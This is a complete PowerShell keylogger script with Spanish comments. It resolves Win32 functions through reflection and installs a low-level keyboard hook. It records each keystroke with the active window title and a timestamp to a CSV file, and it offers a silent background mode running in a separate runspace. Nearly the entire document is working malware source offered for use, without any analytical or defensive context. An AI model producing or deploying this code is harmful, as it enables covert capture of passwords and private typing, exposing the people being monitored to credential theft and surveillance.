[CmdletBinding()]
Param (
    [Parameter(Position = 0)]
    [String]$LogPath = ".\key.log",

    [Parameter()]
    [Switch]$ShowInConsole,

    [Parameter()]
    [Switch]$Background,

    [Parameter()]
    [Double]$Timeout
)

# Resolver ruta absoluta para el LogPath si no está vacía
if ($LogPath) {
    $LogPath = [System.IO.Path]::GetFullPath($LogPath)
}

$Script = {
    Param (
        [String]$LogPath,
        [Switch]$ShowInConsole,
        [Double]$Timeout
    )

    function local:Get-DelegateType {
        Param (
            [OutputType([Type])]
            [Parameter(Position = 0)]
            [Type[]]$Parameters = (New-Object Type[](0)),
            [Parameter(Position = 1)]
            [Type]$ReturnType = [Void]
        )
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        return $TypeBuilder.CreateType()
    }

    function local:Get-ProcAddress {
            Param (
                [OutputType([IntPtr])]
                [Parameter(Position = 0, Mandatory = $True)]
                [String]$Module,
                [Parameter(Position = 1, Mandatory = $True)]
                [String]$Procedure
            )
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            
            # Obtener el método GetModuleHandle de forma explícita
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle', [Type[]]@([System.String]))
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            
            # Corrección de la firma: Seleccionar la sobrecarga que acepta dos IntPtr (o SafeHandle) nativos
            # Evitamos el uso de HandleRef explícito si el entorno de ejecución requiere punteros directos
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.IntPtr], [System.String]))
            
            if ($GetProcAddress -eq $null) {
                # Búsqueda de respaldo si la firma difiere en la versión específica de .NET
                $GetProcAddress = $UnsafeNativeMethods.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1
            }

            # Invocar pasando directamente el puntero del módulo obtenido
            return $GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
        }

    [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')

    # Imports
    $SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA
    $SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
    $SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)

    $CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx
    $CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
    $CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)

    $UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx
    $UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])
    $UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)

    $PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA
    $PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
    $PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)

    $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
    $GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
    $GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)

    $GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
    $GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
    $GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)

    $GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA
    $GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
    $GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)

    $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
    $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)

    $Global:LastWindow = ""

    $CallbackScript = {
        Param (
            [Int32]$Code,
            [IntPtr]$wParam,
            [IntPtr]$lParam
        )

        $Keys = [Windows.Forms.Keys]
        $MsgType = $wParam.ToInt32()

        # Procesar WM_KEYDOWN y WM_SYSKEYDOWN
        if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
            $hWindow = $GetForegroundWindow.Invoke()
            $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
            $Shift = (($ShiftState -band 0x8000) -eq 0x8000)
            $Caps = [Console]::CapsLock

            # Leer la tecla virtual
            $vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)
            $Key = ""

            # Traducir teclas
            if ($vKey -gt 64 -and $vKey -lt 91) {
                if ($Shift -xor $Caps) { $Key = $vKey.ToString() }
                else { $Key = $vKey.ToString().ToLower() }
            }
            elseif ($vKey -ge 96 -and $vKey -le 111) {
                switch ($vKey.value__) {
                    96 { $Key = '0' }
                    97 { $Key = '1' }
                    98 { $Key = '2' }
                    99 { $Key = '3' }
                    100 { $Key = '4' }
                    101 { $Key = '5' }
                    102 { $Key = '6' }
                    103 { $Key = '7' }
                    104 { $Key = '8' }
                    105 { $Key = '9' }
                    106 { $Key = "*" }
                    107 { $Key = "+" }
                    108 { $Key = "|" }
                    109 { $Key = "-" }
                    110 { $Key = "." }
                    111 { $Key = "/" }
                }
            }
            elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {
                if ($Shift) {
                    switch ($vKey.value__) {
                        48 { $Key = ')' }
                        49 { $Key = '!' }
                        50 { $Key = '@' }
                        51 { $Key = '#' }
                        52 { $Key = '$' }
                        53 { $Key = '%' }
                        54 { $Key = '^' }
                        55 { $Key = '&' }
                        56 { $Key = '*' }
                        57 { $Key = '(' }
                        186 { $Key = ':' }
                        187 { $Key = '+' }
                        188 { $Key = '<' }
                        189 { $Key = '_' }
                        190 { $Key = '>' }
                        191 { $Key = '?' }
                        192 { $Key = '~' }
                        219 { $Key = '{' }
                        220 { $Key = '|' }
                        221 { $Key = '}' }
                        222 { $Key = '"' }
                    }
                }
                else {
                    switch ($vKey.value__) {
                        48 { $Key = '0' }
                        49 { $Key = '1' }
                        50 { $Key = '2' }
                        51 { $Key = '3' }
                        52 { $Key = '4' }
                        53 { $Key = '5' }
                        54 { $Key = '6' }
                        55 { $Key = '7' }
                        56 { $Key = '8' }
                        57 { $Key = '9' }
                        186 { $Key = ';' }
                        187 { $Key = '=' }
                        188 { $Key = ',' }
                        189 { $Key = '-' }
                        190 { $Key = '.' }
                        191 { $Key = '/' }
                        192 { $Key = '`' }
                        219 { $Key = '[' }
                        220 { $Key = '\' }
                        221 { $Key = ']' }
                        222 { $Key = "'" }
                    }
                }
            }
            else {
                switch ($vKey) {
                    $Keys::F1  { $Key = '<F1>' }
                    $Keys::F2  { $Key = '<F2>' }
                    $Keys::F3  { $Key = '<F3>' }
                    $Keys::F4  { $Key = '<F4>' }
                    $Keys::F5  { $Key = '<F5>' }
                    $Keys::F6  { $Key = '<F6>' }
                    $Keys::F7  { $Key = '<F7>' }
                    $Keys::F8  { $Key = '<F8>' }
                    $Keys::F9  { $Key = '<F9>' }
                    $Keys::F10 { $Key = '<F10>' }
                    $Keys::F11 { $Key = '<F11>' }
                    $Keys::F12 { $Key = '<F12>' }
                    $Keys::Snapshot    { $Key = '<Print Screen>' }
                    $Keys::Scroll      { $Key = '<Scroll Lock>' }
                    $Keys::Pause       { $Key = '<Pause>' }
                    $Keys::Insert      { $Key = '<Insert>' }
                    $Keys::Home        { $Key = '<Home>' }
                    $Keys::Delete      { $Key = '<Delete>' }
                    $Keys::End         { $Key = '<End>' }
                    $Keys::Prior       { $Key = '<Page Up>' }
                    $Keys::Next        { $Key = '<Page Down>' }
                    $Keys::Escape      { $Key = '<Esc>' }
                    $Keys::NumLock     { $Key = '<Num Lock>' }
                    $Keys::Capital     { $Key = '<Caps Lock>' }
                    $Keys::Tab         { $Key = '<Tab>' }
                    $Keys::Back        { $Key = '<Backspace>' }
                    $Keys::Enter       { $Key = '<Enter>' }
                    $Keys::Space       { $Key = '<Space>' }
                    $Keys::Left        { $Key = '<Left>' }
                    $Keys::Up          { $Key = '<Up>' }
                    $Keys::Right       { $Key = '<Right>' }
                    $Keys::Down        { $Key = '<Down>' }
                    $Keys::LMenu       { $Key = '<Alt>' }
                    $Keys::RMenu       { $Key = '<Alt>' }
                    $Keys::LWin        { $Key = '<Win>' }
                    $Keys::RWin        { $Key = '<Win>' }
                    $Keys::LShiftKey   { $Key = '<Shift>' }
                    $Keys::RShiftKey   { $Key = '<Shift>' }
                    $Keys::LControlKey { $Key = '<Ctrl>' }
                    $Keys::RControlKey { $Key = '<Ctrl>' }
                }
            }

            # Obtener el título de la ventana activa
            $TitleBuilder = New-Object Text.Stringbuilder 256
            $GetWindowText.Invoke($hWindow, $TitleBuilder, $TitleBuilder.Capacity)
            $CurrentWindow = $TitleBuilder.ToString()

            # Guardar en archivo si LogPath está especificado
            if ($LogPath) {
                $Props = @{
                    Key = $Key
                    Time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    Window = $CurrentWindow
                }
                $obj = New-Object psobject -Property $Props
                $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]
                Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
            }

            # Mostrar en consola en tiempo real
            if ($ShowInConsole) {
                if ($Global:LastWindow -ne $CurrentWindow) {
                    $Global:LastWindow = $CurrentWindow
                    Write-Host "`n[$((Get-Date -Format 'HH:mm:ss')) - $CurrentWindow]`n" -ForegroundColor Cyan
                }

                if ($Key -eq '<Enter>') {
                    Write-Host ""
                } elseif ($Key -eq '<Space>') {
                    Write-Host -NoNewline " "
                } elseif ($Key -eq '<Tab>') {
                    Write-Host -NoNewline " [Tab] "
                } elseif ($Key -like '<*') {
                    # Mostrar teclas especiales con formato llamativo
                    Write-Host -NoNewline " [$($Key.Trim('<>'))] " -ForegroundColor Yellow
                } else {
                    Write-Host -NoNewline $Key
                }
            }
        }
        return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
    }

    # Registrar el Hook
    $Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
    $Callback = $CallbackScript -as $Delegate
    $PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
    $ModuleHandle = $GetModuleHandle.Invoke($PoshModule)
    $Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)

    $Stopwatch = [Diagnostics.Stopwatch]::StartNew()

    try {
        if ($ShowInConsole) {
            Write-Host "Keylogger activo en tiempo real. Presiona Ctrl+C para detener y limpiar." -ForegroundColor Green
        }
        while ($true) {
            if ($Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }
            $PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
            Start-Sleep -Milliseconds 10
        }
    }
    finally {
        # Desinstalar Hook
        $UnhookWindowsHookEx.Invoke($Hook)
        if ($ShowInConsole) {
            Write-Host "`nKeylogger detenido y hook liberado correctamente." -ForegroundColor Red
        }
    }
}

if ($Background) {
    if (-not $LogPath) {
        Write-Error "Debes especificar un -LogPath para correr en modo Background."
        return
    }
    # Inicializar Runspace
    $PowerShell = [PowerShell]::Create()
    [void]$PowerShell.AddScript($Script)
    [void]$PowerShell.AddArgument($LogPath)
    [void]$PowerShell.AddArgument($false) # ShowInConsole = $false para segundo plano
    if ($Timeout) { [void]$PowerShell.AddArgument($Timeout) }

    # Guardar en variable global para que el usuario pueda recuperarlo/detenerlo si quiere
    $Global:KeyloggerPowerShellInstance = $PowerShell
    [void]$PowerShell.BeginInvoke()

    Write-Host "Keylogger iniciado en segundo plano. Guardando en: $LogPath" -ForegroundColor Green
    Write-Host "Para detenerlo usa: `$Global:KeyloggerPowerShellInstance.Dispose()" -ForegroundColor Yellow
} else {
    # Ejecutar en primer plano
    & $Script -LogPath $LogPath -ShowInConsole:$ShowInConsole -Timeout $Timeout
}
